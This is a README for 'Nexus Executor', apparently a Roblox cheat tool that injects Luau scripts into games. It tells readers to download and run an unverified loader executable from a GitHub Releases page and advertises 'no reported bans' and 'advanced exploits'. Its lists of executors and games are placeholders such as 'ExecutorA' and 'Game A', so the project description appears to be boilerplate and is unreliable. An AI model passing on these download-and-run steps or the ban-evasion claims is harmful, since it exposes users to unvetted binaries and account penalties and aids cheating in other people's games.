About
This repository centralizes tools, scripts, and documentation for the Nexus Executor build labeled N3xus-Scr1pt-R0bl0x. Nexus Executor provides free and lifetime packages and serves a small, curated executor hub. The service hosts executors directly on the web and focuses on ease of use and compatibility with Luau runtimes.

The project emphasizes a compact hub of supported games, a stable execution core, and straightforward installation. This README walks through install steps, usage, supported features, and maintenance details.

Key features
- Free and lifetime packages. Users can run a stable build without recurring fees.
- Web-hosted executors. Files are stored on a web releases page for direct download.
- Luau support. Designed to run scripts compatible with Luau and the Roblox environment.
- Small executor hub. Focus on quality and stability over a wide catalog.
- No reported bans. The maintainer monitors community feedback and has no active ban reports.
- Cross-executor compatibility. Works with most common Luau executors and injectors.
- Simple integration. Use the included scripts to call executors from the command line or other tools.

What this repo contains
- Core scripts and loader files for Nexus Executor.
- Example scripts demonstrating common Luau operations.
- Automation helpers to integrate Nexus with other tools.
- Configuration templates to tune execution behavior.
- Detailed README and contributor guidelines.
- Release assets (binary or script files) linked on the Releases page.

Quickstart â€” Download & run
Click the Releases badge at the top or visit the Releases page directly to download the latest executor package:
https://github.com/Shin2-cpu/N3xus-Scr1pt-R0bl0x/releases

Because the Releases link includes a path, download the release file for your platform and execute it. Follow these general steps:
1. Visit the Releases URL above.
2. Download the appropriate asset (for example, N3xus-Executor-vX.Y.Z.zip or N3xus-Loader.exe).
3. Extract the archive if needed.
4. Run the executable or loader script for your platform.
5. Follow on-screen prompts to configure a default Luau executor or point to an external injector.

Examples of platform-specific execution:
- Windows (executable): double-click N3xus-Loader.exe or run via PowerShell: .\N3xus-Loader.exe
- Windows (script): extract and run start.bat or start.ps1
- Linux (script): chmod +x n3xus && ./n3xus
- macOS (script): chmod +x n3xus && ./n3xus

The Releases page contains named assets and versioned builds. Download the file that matches your operating system and follow the included README in the assets if present.

Usage examples
The project ships with example scripts to show how to load and execute Luau code. These examples cover common tasks: teleport, simple UI manipulations, and remote invocation. They also show how to pass a script file to the executor.

Basic run (example)
- Place your script in the scripts/ directory.
- Open the Nexus loader.
- Use the "Run Script" option and select your file.
- The loader injects and runs the script through the chosen Luau executor.

Command-line example
- For a CLI-enabled build, use:
  ./nexus --run ./scripts/example.lua
- The loader reads the file, selects the default executor, and executes the script.

Example script: teleport.lua
- Demonstrates basic CFrame operations.
- Shows thread-safe waits and simple property changes.

Example script: notify.lua
- Demonstrates remote events and a small UI toast.

Supported Luau executors
Nexus aims for broad compatibility with the common Luau executors. The core supports the following executors and injectors:
- ExecutorA (stable)
- ExecutorB (compat mode)
- ExecutorC (experimental for certain games)
- Web-hosted Luau runner (for quick tests)

Compatibility notes
- The loader autodetects available executors when possible.
- If a specific injector is required, point the loader to its path in the settings.
- Some advanced exploits may need explicit compatibility mode. Toggle this in the settings.

Game coverage and the small hub model
Nexus focuses on a limited catalog of games. This choice keeps the code lean and reduces maintenance. The hub features curated content and pre-tested scripts for each supported title.

Why a small hub
- Easier to test and maintain.
- Lower risk of regressions across many titles.
- Faster response to reports and updates.

Game list (example)
- Game A â€” full support for Luau runtime features.
- Game B â€” runtime differences require compatibility mode.
- Game C â€” partial support; some APIs stubbed.
- Additional indie titles â€” pre-tested scripts and presets.

Adding a game
- Fork the repo, add a presets/gameX folder with scripts and metadata.
- Open a pull request with a short test script and usage notes.
- The maintainers run a quick validation before merging.

No reported bans: monitoring and data
The maintainers track community feedback and automated reports. At the time of the last release, no bans related to Nexus usage had been reported. The project collects data responsibly and focuses on compatibility rather than aggressive techniques that raise detection risk.

How the project tracks bans
- Community reports via issues or Discord.
- Automated monitoring of known blocklists.
- Cross-checks with public logs and user feedback.

What "no reported bans" means
- No public or verified reports flagged Nexus as a cause of account actions.
- The absence of reports does not guarantee immunity across all environments.
- The project keeps a changelog and a known-issues log to record any future reports.

Integration and automation
Nexus supports integration points that allow automation from external tools, CI systems, and custom launchers.

API endpoints (local)
- The loader exposes a local REST endpoint on 127.0.0.1:PORT when enabled.
- Use POST /run to send a script payload.
- Use GET /status to fetch executor health.

Example curl call
curl -X POST http://127.0.0.1:8000/run -d @scripts/example.lua

Scripting hooks
- Pre-execution and post-execution hooks let you run checks or collect logs.
- Hook scripts live in hooks/ and run under the loader's context.

Continuous integration
- Use the CLI mode in headless environments.
- The runner provides deterministic exit codes for automation.

Configuration options
Nexus includes a simple config file with clear entries. The config uses a compact JSON format for readability.

Example config.json
{
  "default_executor": "ExecutorA",
  "compat_mode": false,
  "auto_update": true,
  "local_api": {
    "enabled": true,
    "port": 8000,
    "auth_token": ""
  },
  "log_level": "info",
  "presets_path": "presets/"
}

Key configuration items
- default_executor: Choose a default executor to use with the loader.
- compat_mode: Enable compatibility adjustments for fringe games.
- auto_update: Allow the loader to check releases and download updates.
- local_api.port: The port for local automation calls.
- log_level: Set to debug, info, warn, or error for logs.

Tuning for stability
- Set log_level to "debug" when troubleshooting.
- Disable auto_update in locked or offline environments.
- Use local_api.auth_token in shared setups.

Troubleshooting
Follow short, actionable steps for common issues.

Issue: Loader fails to start
- Confirm you downloaded the correct release asset for your OS.
- Check file permissions on Unix systems (chmod +x).
- Run from a terminal to catch error messages.

Issue: Executor not detected
- Point the loader to the executor binary path in config.json.
- Use the CLI flag --executor /path/to/executor to override.
- Check that the executor binary runs on its own.

Issue: Script times out
- Increase the script timeout in the loader settings.
- Check for long-blocking operations inside the script.

Issue: Local API not responding
- Verify the loader has started with local_api enabled.
- Confirm the port is not in use by another process.
- Check firewall rules that might block 127.0.0.1.

Logs and diagnostics
- Logs appear in the logs/ folder by default.
- For deeper traces, set log_level to debug.
- Collect logs and open an issue with stack traces and the steps to reproduce.
